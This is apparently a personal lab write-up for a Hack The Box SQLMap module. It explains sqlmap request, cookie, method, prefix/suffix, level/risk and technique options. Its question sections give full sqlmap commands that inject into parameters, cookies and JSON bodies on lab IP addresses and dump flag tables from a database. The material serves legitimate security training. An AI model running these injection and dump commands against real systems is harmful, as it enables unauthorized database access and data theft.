# Building Attacks

## Curl Commands

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```shell-session
eldeim@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

## GET/POST Requests

```shell-session
eldeim@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
## or
eldeim@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

## Custom SQLMap Requests

For example, if there is a requirement to specify the (session) cookie value to `PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c` option `--cookie` would be used as follows:

```shell-session
eldeim@htb[/htb]$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

The same effect can be done with the usage of option `-H/--header`:

```shell-session
eldeim@htb[/htb]$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

Also, if we wanted to specify an alternative HTTP method, other than `GET` and `POST` (e.g., `PUT`), we can utilize the option `--method`, as follows:

```shell-session
eldeim@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT
```

### PoCs - Questions

First flag attach into parameter "id" via POST, we can copy the website curl

```
sqlmap -u http://83.136.253.217:42957/case2.php --data 'id=1' --method POST
```

***

Second fllag, we need see all cookies and we do one with name id and value 1, ez

```
sqlmap -u "http://83.136.253.217:42957/case3.php" --cookie="id=1"
## later dump flag
sqlmap -u "http://83.136.253.217:42957/case3.php" --cookie="id=1" -D testdb -T flag3 --dump
```

***

To end, we have a sqli JSON, yeah... Something inusual

<pre><code>sqlmap -u "http://83.136.253.217:42957/case4.php" --headers="Content-Type: application/json" --data='{"id": 1}' -p id --level=5 --risk=3
## dump the flag
<strong>sqlmap -u "http://83.136.253.217:42957/case4.php" --headers="Content-Type: application/json" --data='{"id": 1}' -p id --level=5 --risk=3 -D testdb -T flag4 --dump
</strong></code></pre>

***

## Attack Tuning

&#x20;Every payload sent to the target consists of:

* vector (e.g., `UNION ALL SELECT 1,2,VERSION()`): central part of the payload, carrying the useful SQL code to be executed at the target.
* boundaries (e.g. `'<vector>-- -`): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement.

### Prefix/Suffix

For such runs, options `--prefix` and `--suffix` can be used as follows:

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

This will result in an enclosure of all vector values between the static prefix `%'))` and the suffix `-- -`.

### Level/Risk

For such demands, the options `--level` and `--risk` should be used:

* The option `--level` (`1-5`, default `1`) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
* The option `--risk` (`1-3`, default `1`) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).

As for the number of payloads, by default (i.e. `--level=1 --risk=1`), the number of payloads used for testing a single parameter goes up to 72, while in the most detailed case (`--level=5 --risk=3`) the number of payloads increases to 7,865.

### Techniques

For example, if we want to skip the time-based blind and stacking SQLi payloads and only test for the boolean-based blind, error-based, and UNION-query payloads, we can specify these techniques with `--technique=BEU`.

### PoCs - Questions

In this case, the flag is sending into the id for GET peticion and it is vulnerable

```
sqlmap 'http://94.237.57.57:43835/case5.php?id=1' --level=5 --risk=3 -p id --batch --method GET
##dump the flag
sqlmap 'http://94.237.57.57:43835/case5.php?id=1' --level=5 --risk=3 -p id --batch --method GET -D testdb -T flag5 --dump
```

***

NAH.. the next flag is a same, GET peticion but the vuln vector is "col". OMFG, I waited 40 mints for get the flag because it is a time based blind

```
sqlmap -u "http://94.237.57.57:43835/case6.php?col=id" -p col --level=5 --risk=3 --batch
##dump
sqlmap -u "http://94.237.59.174:42612/case6.php?col=id" -p col --level=5 --risk=3 --random-agent --batch -D testdb -T flag6 --dump --time-sec=2 --threads=5
```

***

The end flag 7 is a get id union, another basic. We can see 5 columns too

```
sqlmap -u "http://94.237.59.174:43464/case7.php?id=1" --union-cols=5 --technique=U --dbms=mysql --level=5 --risk=3 --batch --random-agent
##dump
sqlmap -u "http://94.237.59.174:43464/case7.php?id=1" --union-cols=5 --technique=U --dbms=mysql --level=5 --risk=3 --batch --random-agent -D testdb -T flag7 --dump
```

